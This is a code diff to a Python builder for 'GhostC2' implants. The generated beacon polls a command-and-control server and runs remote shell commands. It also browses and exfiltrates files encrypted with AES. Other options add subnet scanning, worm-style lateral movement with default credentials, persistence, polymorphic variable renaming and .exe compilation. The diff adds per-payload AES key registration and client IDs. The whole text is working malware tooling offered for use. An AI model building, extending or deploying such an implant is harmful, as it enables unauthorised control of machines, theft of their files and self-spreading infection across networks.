@@ -17,22 +17,24 @@ import subprocess
 import base64
 import random
 
+key = {aes_key_literal}
+
 def aes_encrypt(plaintext):
     from Crypto.Cipher import AES
     from Crypto.Util.Padding import pad
     from Crypto.Random import get_random_bytes
     import base64
 
-    key = b"ThisIs32ByteAESKey_For_GhostC2!!"  # Must match server
+    
     iv = get_random_bytes(16)
     cipher = AES.new(key, AES.MODE_CBC, iv)
     ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
     return base64.b64encode(iv + ct_bytes).decode()
 
+CLIENT_ID = "{client_id}"
 
 SLEEP_TIME = 15
 JITTER_RANGE = 5
-
 
 C2_URL = "{c2_url}"
 RESULT_URL = "{result_url}"
@@ -116,7 +118,6 @@ def handle_browse(path):
     except Exception as e:
         return json.dumps({{"error": str(e)}})
 
-
 def {beacon_func}():
     if IS_WORM:
         print("[*] Worm mode enabled — beginning propagation...")
@@ -126,9 +127,25 @@ def {beacon_func}():
             lateral_move(ip, "admin", "password", "builds/ghost_payload_drop.py")
 
     {host_var} = socket.gethostname()
+    registered = False
 
     while True:
+        if not registered:
+            reg_payload = {{
+                "client_id": CLIENT_ID,
+                "aes_key": base64.b64encode(key).decode()
+            }}
+            try:
+                requests.post(C2_URL.replace("/beacon", "") + "/register", json=reg_payload, timeout=5)
+                print("[*] AES key registered with C2")
+                registered = True
+            except Exception as e:
+                print(f"[!] Registration failed: {{e}}")
+                time.sleep(5)
+                continue
+
         {data_var} = {{
+            "client_id": CLIENT_ID,
             "hostname": {host_var},
             "payload": "idle"
         }}
@@ -143,8 +160,7 @@ def {beacon_func}():
                 {task_var} = {resp_var}.get("tasks", [])
 
                 for {cmd_var} in {task_var}:
-                    print(f"[+] Executing: {{{{ {cmd_var} }}}}")
-
+                    print(f"[+] Executing: {{{{{cmd_var}}}}}")
                     try:
                         task_json = json.loads({cmd_var})
                         action = task_json.get("action", None)
@@ -171,12 +187,12 @@ def {beacon_func}():
                         try:
                             with open({file_path}, "rb") as f:
                                 {b64data} = base64.b64encode(f.read()).decode()
-                            {result_var} = f"[EXFIL:{{{{ {file_path} }}}}]\\n{{{{ {b64data} }}}}"
+                            {result_var} = f"[EXFIL:{file_path}]" + "\\n" + f"{b64data}"
                         except Exception as e:
                             {result_var} = f"[!] Failed to read file: {{e}}"
 
                     elif action == "browse":
-                        path = task_json.get("path", "/" if os.name != 'nt' else r"C:\")
+                        path = task_json.get("path", \"/\" if os.name != 'nt' else \"C:\\\\\\\\\")
                         {result_var} = handle_browse(path)
 
                     elif action == "shell":
@@ -188,7 +204,6 @@ def {beacon_func}():
                             {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
 
                     else:
-                        # Backward compatibility: treat as string commands if not valid JSON
                         if {cmd_var}.startswith("scan "):
                             parts = {cmd_var}.split("ports:")
                             target_subnet = parts[0].replace("scan", "").strip()
@@ -209,7 +224,7 @@ def {beacon_func}():
                             try:
                                 with open({file_path}, "rb") as f:
                                     {b64data} = base64.b64encode(f.read()).decode()
-                                {result_var} = f"[EXFIL:{{{{ {file_path} }}}}]\\n{{{{ {b64data} }}}}"
+                                {result_var} = f"[EXFIL:{file_path}]" + "\\n" + f"{b64data}"
                             except Exception as e:
                                 {result_var} = f"[!] Failed to read file: {{e}}"
 
@@ -224,7 +239,7 @@ def {beacon_func}():
                             except subprocess.CalledProcessError as e:
                                 {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
 
-                    print(f"[>] Sending result:\\n{{{{ {result_var} }}}}")
+                    print(f"[>] Sending result:\\n{{{{{result_var}}}}}")
 
                     {result_obj} = {{
                         "hostname": {host_var},
@@ -233,7 +248,6 @@ def {beacon_func}():
                     }}
                     {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
                     requests.post(RESULT_URL, data={encrypted_result}.encode())
-
 
         except Exception as e:
             print(f"[!] Beacon failed: {{e}}")
@@ -244,8 +258,8 @@ def {beacon_func}():
 
 if __name__ == "__main__":
     {beacon_func}()
-
 '''
+
 
 
 
@@ -272,7 +286,9 @@ def generate_variable_names():
         'b64data': rand_name()
     }
 
-def generate_payload(c2_url, result_url, output_path, is_worm):
+def generate_payload(c2_url, result_url, output_path, is_worm, aes_key):
+
+
     var_names = generate_variable_names()
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -280,18 +296,25 @@ def generate_payload(c2_url, result_url, output_path, is_worm):
     abs_utils_path = os.path.join(repo_root, "utils")
     abs_utils_path = abs_utils_path.replace("\\", "\\\\")
 
+    client_id = rand_name(10)
+    aes_key_literal = repr(aes_key)  # add above the format call if not already done
+
     filled_code = PAYLOAD_TEMPLATE.format(
+        client_id=client_id,
         c2_url=c2_url,
         result_url=result_url,
         abs_utils_path=abs_utils_path,
         is_worm=is_worm,
+        aes_key_literal=aes_key_literal,  # ✅ include this
         **var_names
     )
+
 
     with open(output_path, 'w') as f:
         f.write(filled_code)
 
     print(f"[+] Polymorphic payload written to: {output_path}")
+    print(f"[+] Payload Client ID: {client_id}")
 
 def compile_to_exe(source_path):
     print(f"[+] Compiling {source_path} to .exe...")
@@ -321,7 +344,23 @@ if __name__ == "__main__":
     parser.add_argument("--persist", action="store_true", help="Add persistence stub")
     parser.add_argument("--worm", action="store_true", help="Enable self-propagation mode")
     parser.add_argument("--output", help="Custom output filename for payload")
+    parser.add_argument("--aes", help="Base64-encoded AES-256 key for encryption")
+
     args = parser.parse_args()
+
+    # AES key handling (optional per-payload encryption)
+    if args.aes:
+        import base64
+        try:
+            aes_key = base64.b64decode(args.aes)
+            if len(aes_key) != 32:
+                raise ValueError("AES key must be exactly 32 bytes")
+        except Exception as e:
+            print(f"[!] Invalid AES key: {e}")
+            sys.exit(1)
+    else:
+        aes_key = b"ThisIs32ByteAESKey_For_GhostC2!!"  # fallback static key
+
 
     os.makedirs("builds", exist_ok=True)
 
@@ -332,7 +371,8 @@ if __name__ == "__main__":
         filename = f"ghost_payload_{timestamp}.py"
         output_path = os.path.join("builds", filename)
 
-    generate_payload(args.c2, args.result, output_path, args.worm)
+    generate_payload(args.c2, args.result, output_path, args.worm, aes_key)
+
 
     if args.exe:
         compile_to_exe(output_path)
